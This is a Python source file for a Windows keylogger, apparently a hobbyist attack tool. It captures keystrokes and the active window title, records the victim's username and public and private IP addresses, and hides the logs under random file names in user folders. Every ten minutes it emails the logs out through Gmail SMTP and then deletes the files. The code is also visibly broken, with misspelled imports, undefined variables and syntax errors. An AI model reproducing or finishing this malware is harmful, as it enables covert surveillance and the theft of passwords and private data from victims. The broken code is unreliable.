import time, os, random, requests, socket, requets, win32gui, sys, platform, gui
import random, string, datetime, smtp, traceback, threading
from pyinput.keyboard import key, Listener
from datetime import datetime
from . import config
from config import *
from . import colors
from colors import all
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

############################################
# simple_keylogging script w/ email and
# simple obfuscation.
## to replace print statemetns add socks later
## to add better file obfuscration later.
## to class 'emailer' for better readibilty
## CONFIG .PY
## copyleft, all wrongs reserved to adel al
############################################

'''Change the config settings to your own
  fromAddr = 'example@gmail.com'
  fromPswd = 'example_password' '''


### add hashing function for added protection.

## establish keyworld obj/values for later in the script.
substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']


current_time = time.ctime(time.time())
datetime = datetime.now()
extIP = requests.get('https://api.ipify.org').text()
pvtIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]

if 'win32' not in platform.platform:
    print(f'[+] OS Must Be Win32. GOODBYE!')
    time.sleep(1)
    sys.exit(1)

print(pvtIP)
print(user)

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {extIP}\n  *~ Private-IP: {pubIP}\n\n'
logged_data = []
logged_data.append(msg)
old_app = ''
rm_file = []

## establish
def on_press():
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
        key = str(key).strip('\n')
        if key in substitution:
            logged_data.append(substitution[substitution.index(key)+1])
        else:logged_data.append(f'[!] Listening.. {time.time()}' )


# create files in random folder, and obfuscate filename
# creates a list, with random choice for hidden path.
# adds OS.function to make file hidden

def write_txt(*args):
    global count
    count = 0
    ## logic for simple file path/name obfuscation
    print(f'[+] **Starting Write Function [+]\n {key}')
    hidden_path = []
    user_dir = os.path.expanduser('~')
    if os.path.isdir(user_dir + '/Documents/'):
        chance_one = os.path.expanduser('~') + '/Documents/'
        hidden_path.append(chance_one)
    if os.path.isdir(user_dir + '/Pictures/'):
        chance_two = os.path.expanduser('~') + '/Pictures/'
        hidden_path.append(chance_two)
    if os.path.isdir(user_dir + '/AppData/'):
        chance_three = os.path.expanduser('~') + '/AppData/
        hidden_path.append(chance_three)
    else:
        print('[-] $Userhome does not contain common dirs found in win32.')
        sys.exit(1)

    filepath = str(random.choice(hidden_path))
    file_time = datetime.now
    key_vals = list(string.printable)
    keys = random.sample(key_vals, 6)
    hidden_file = str(keys) + str(random.randint(10000000, 999999)) + str(file_time) + str(keys) + 'txt'
    print(f'[+] [Hidden Path] [+]\n {hidden_path}')
    print(f'[+] [Hidden File Location] [+]\n [{filepath}]')
    print(f'[+] Hidden File Absolute] [+] \n [{hidden_file}]')
    rm_file = [hidden_file] ## to remove later

    with open(hidden_file, 'a') as f:
        f.write(''.join(logged_data) + '\n')

def send_logs(*args):
    log_count = 0
    fromAddr=config.fromAddr
    fromPwd=config.frompwd
    toAddr=fromAddr
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
    print(f'[+] Email Logger is set to \n[ADDR] [{fromAddr}]')
    while True:
        if len(logged_data) > 1:
            try:
                write_txt(count)
                subject = f'[{user}] ~ {count}'
                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'testing'
                msg.attach(MIMEText(body, 'plain'))
                attachment = open(rm_file[0], 'rb')
                print('attachment')
                filename = rm_file[0].split('/')[2]
                part = MIMEBase('application', 'octect-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
                msg.attach(part)
                text = msg.as_string()
                print('test msg.as_string')
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                print('starttls')
                s.ehlo()
                s.login(fromAddr, fromPwd)
                s.sendmail(fromAddr, toAddr, text)
                print('sent mail')
                attachment.close()
                s.close()
                os.remove(rm_file[0])
                del logged_data[1:]
                del rm_file[0:]
                print(f'[+] delete data/files')
                log_count += 1

            except Exception as errorString:
                print('[!] send_logs // Error.. ~ %s' % (errorString))
                print(traceback.print_exc)
                pass
            except:pass

## set logging thread and Listener context manager.
def main():
    print(f'{red}\t\t[+]-[+] copyleft material from Adel Al [+]-[+] All Wrongs Reserved. [+]-[+] {reset}'
    t1 = threading.Thread(target=send_logs)
    t1.start()

    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__'
    main()


